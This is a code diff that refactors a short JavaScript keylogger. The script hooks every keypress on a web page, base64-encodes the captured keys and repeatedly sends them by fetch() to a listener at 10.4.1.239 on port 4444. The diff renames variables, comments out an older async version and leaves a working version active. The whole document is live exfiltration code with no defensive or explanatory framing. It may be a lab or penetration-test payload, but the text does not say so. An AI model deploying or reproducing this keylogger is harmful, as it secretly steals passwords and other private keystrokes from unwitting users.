@@ -1,16 +1,25 @@
-const LHOST = '10.4.1.239';
-const PORT = '4444';
+const lhost = '10.4.1.239';
+const port = '4444';
+const interval = 10000
 let keys = '';
-let sent_keys = '';
+let sentKeys = '';
 
-document.onkeypress = function(e) {
+document.onkeypress = (e) => {
     keys += e.key;
 }
 
-setInterval(async function() {
-    let sending_keys = keys.replace(sent_keys, '');
-    if(sending_keys) {
-	sent_keys += sending_keys;
-	await fetch(`http://${LHOST}:${PORT}?key=` + btoa(sending_keys));
+//setInterval(async () => {
+//    let sendingKeys = keys.replace(sentKeys, '');
+//    if(sendingKeys) {
+//	sentKeys += sendingKeys;
+//	await fetch(`http://${lhost}:${port}?key=` + btoa(sendingKeys));
+//    }
+//}, interval)
+
+setInterval(() => {
+    let sendingKeys = keys.replace(sentKeys, '');
+    if(sendingKeys) {
+	sentKeys += sendingKeys;
+	fetch(`http://${lhost}:${port}?key=` + btoa(sendingKeys));
     }
-}, 5000)
+}, interval)
